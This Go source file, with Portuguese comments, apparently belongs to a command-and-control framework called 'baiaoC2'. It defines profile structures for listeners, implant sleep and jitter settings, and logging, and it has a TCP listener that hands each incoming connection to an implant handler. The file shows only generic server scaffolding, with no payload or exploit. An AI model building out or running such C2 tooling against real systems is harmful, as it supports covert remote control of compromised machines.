package teamserver

import (
	"fmt"
	"log"
	"net"
	"baiaoC2/server/handlers"
)

// C2Profile define a estrutura do perfil do C2
type C2Profile struct {
	Name      string     `json:"name"`
	Version   string     `json:"version"`
	Listeners []Listener `json:"listeners"`
	Implants  Implants   `json:"implants"`
	Logging   Logging    `json:"logging"`
}

// Listener representa um listener de conexão do C2
type Listener struct {
	Type string
	Host string
	Port int
	Key  string
}

// Estrutura de implantes
type Implants struct {
	SleepTime     int     `json:"sleep_time"`
	Jitter        float64 `json:"jitter"`
	MaxRetries    int     `json:"max_retries"`
}

// Estrutura de logs
type Logging struct {
	Level string `json:"level"`
	File  string `json:"file"`
}


// startListener inicia um listener individual
func startListener(listener Listener) {
	addr := fmt.Sprintf("%s:%d", listener.Host, listener.Port)
	log.Printf("[+] Iniciando listener %s em %s", listener.Type, addr)

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[-] Falha ao iniciar listener: %v", err)
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("[-] Erro ao aceitar conexão: %v", err)
			continue
		}

		log.Printf("[+] Nova conexão recebida de %s", conn.RemoteAddr())
		go handlers.HandleImplant(conn, listener.Key)
	}
}
